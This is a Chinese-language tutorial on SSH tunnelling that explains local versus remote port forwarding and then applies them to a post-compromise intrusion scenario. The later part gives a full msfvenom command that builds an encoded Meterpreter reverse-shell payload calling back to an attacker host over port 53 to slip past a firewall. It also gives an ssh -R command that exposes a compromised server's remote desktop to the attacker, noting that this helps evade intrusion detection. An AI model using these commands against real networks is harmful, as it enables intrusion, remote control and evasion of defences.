一、ssh隧道端口转发的目的是什么？  
  
我们使用ssh的-L | -R | -D参数建立各种ssh隧道，只是简单为了访问一个80端口或者3389端口吗？当然不是，说到底，建立隧道的目的是为了实现应用程序的客户端到服务端的连接通讯，在本来并不能通信的应用客户端与服务端之间，通过ssh隧道架起一座桥梁。  
二、本地转发与远程转发的区别适用  
1、ssh隧道本地端口转发与远程转发的区别  

 说白一句话：本地端口转发，监听端口开在ssh客户端。远程端口转发，监听端口开在ssh服务端。如下图

![](../Images/5caea3e4bc0a3ee80828404fa29c019e.png)

2、什么时候用本地端口转发，什么时候又用远程端口转发呢？  
  
我们知道，不论C/S架构还是B/S架构，流量一般都会从客户端发请求开始，甚至包括ssh服务，也是先从客户端发请求给服务端，那么我们就可以把这种流向假定看成是有方向的，即客户端流向服务端。下面是重点来了：  
当应用程序数据流向与ssh协议数据流向相同时，适用本地端口转发。  

![](../Images/939a1d511fb24251869b38e553bc9de5.png)

反之，**当应用程序的数据流向与ssh协议数据流向相反时，适用远程端口转发。**

![](../Images/9f8352e93f9fa3b1b1f702d5881f0fa0.png)

总结一句，**不论本地还是远程，ssh隧道端口总是开在靠近应用客户端的一侧。**

2.  #### 如上图场景中，当我们拿下内网的webserver、dbserver后，通过某个漏洞拿下DCwin2003这台服务器，我们想要在DCwin2003这台服务器安装一个msf马，让其流量通过内网传输到外网的攻击机kali。那么此时就可以使用ssh隧道转发技术，使msf的服务端和客户端建立连接，进而进行通信。这里需要注意的是，穿过防火墙的流量实际是，暴露在ssh外隧道外面的msf\_server的一段流量，因其通信端口为53，所以才巧妙穿过防火墙。其原理图如下：  
    ![](../Images/272067d4a886cb8d1fdbd585bf883e41.png)在攻击机kali上生成msf客户端ma.exe，将其传入到内网的DCwin2003上，生成命令如下。  
      
    msfvenom -p windows/meterpreter/reverse\_tcp\_rc4\_dns lhost=172.16.1.12 lport=53 rc4password=kali -e x86/shikata\_ga\_nai -b '\\x00' -i 3 -f exe -o ma.exe

当我们拿下webserver，再拿下DCwin2003，需要通过3389访问内网服务器DCwin2003的远程桌面时，就可以在webserver上执行下面命令，通过ssh隧道的远程端口转发，实现kali上访问DCwin2003的远程桌面。这里需要注意，穿过防火墙的流量实际是ssh隧道建立的流量，由于这段流量是加密的，因此即使如果防火墙处再有类似ids这类流量检测设备，不被检测的可能性还是会提升。 在webserver执行命令如下  
ssh -CfN -R 7001:172.16.1.13:3389 root@192.168.0.123 -p 53
